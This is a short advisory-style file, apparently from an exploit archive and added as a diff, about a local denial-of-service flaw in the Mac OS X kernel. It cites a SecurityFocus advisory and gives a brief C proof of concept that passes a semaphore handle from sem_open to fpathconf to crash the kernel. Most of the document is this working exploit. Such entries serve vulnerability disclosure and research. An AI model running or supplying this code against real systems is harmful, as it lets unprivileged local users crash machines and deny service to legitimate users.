@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/20982/info
+
+Apple Mac OS X is prone to a local denial-of-service vulnerability because the kernel fails to properly handle the execution of a system call.
+
+Exploiting this issue allows local, unprivileged users to crash affected kernels, denying further service to legitimate users.
+
+#include <unistd.h>
+#include <semaphore.h>
+
+int main() {
+fpathconf(sem_open("DaringWussball", O_CREAT, S_IRWXU, 1), 0);
+}
